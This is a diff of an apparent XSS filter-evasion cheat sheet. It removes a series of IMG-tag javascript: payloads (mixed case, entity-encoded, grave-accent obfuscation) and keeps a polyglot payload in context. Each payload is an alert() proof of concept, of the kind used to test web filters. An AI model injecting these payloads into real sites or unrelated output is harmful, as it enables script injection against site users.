@@ -20,34 +20,6 @@ The following is a "polygot test XSS payload." This test will execute in multipl
 
 `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
 
-### Image XSS Using the JavaScript Directive
-
-Image XSS using the JavaScript directive (IE7.0 doesn't support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:
-
-`<IMG SRC="javascript:alert('XSS');">`
-
-### No Quotes and no Semicolon
-
-`<IMG SRC=javascript:alert('XSS')>`
-
-### Case Insensitive XSS Attack Vector
-
-`<IMG SRC=JaVaScRiPt:alert('XSS')>`
-
-### HTML Entities
-
-The semicolons are required for this to work:
-
-`<IMG SRC=javascript:alert(&quot;XSS&quot;)>`
-
-### Grave Accent Obfuscation
-
-If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don't know about grave accents:
-
-```
-<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
-```
-
 ### Malformed A Tags
 
 Skip the HREF attribute and get to the meat of the XXS... Submitted by David Cross \~ Verified on Chrome
